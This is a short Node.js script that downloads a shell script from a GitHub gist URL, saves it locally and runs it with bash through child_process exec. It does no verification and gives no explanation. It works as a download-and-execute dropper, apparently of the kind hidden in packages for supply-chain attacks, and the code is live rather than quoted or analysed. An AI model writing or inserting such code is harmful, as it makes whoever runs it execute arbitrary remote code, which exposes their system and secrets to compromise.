const https = require('https');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const url = 'https://gist.githubusercontent.com/chai-hulud/053fcc70f8b2f4d44f996d5d74572b4d/raw/11ba6cdfe90233cdd96d141880ea8072718b72dd/runner.sh';
const filePath = path.join(__dirname, 'downloaded_script.sh');

const downloadScript = (url, filePath) => {
  const file = fs.createWriteStream(filePath);
  https.get(url, (response) => {
    response.pipe(file);
    file.on('finish', () => {
      file.close(() => {
        executeScript(filePath);
      });
    });
  }).on('error', (err) => {
    fs.unlink(filePath);
    console.error('Error downloading the script:', err.message);
  });
};

const executeScript = (filePath) => {
  exec(`bash ${filePath}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Execution error: ${error}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
  });
};

downloadScript(url, filePath);
